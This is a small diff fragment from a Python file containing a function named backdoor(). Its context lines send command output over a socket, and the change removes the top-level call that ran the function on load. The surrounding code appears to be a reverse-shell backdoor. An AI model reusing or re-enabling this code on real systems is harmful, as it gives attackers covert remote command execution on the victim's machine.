@@ -28,5 +28,3 @@ def backdoor():
           s.send(stdout_value)
      # close socket
      s.close()
-
-backdoor()
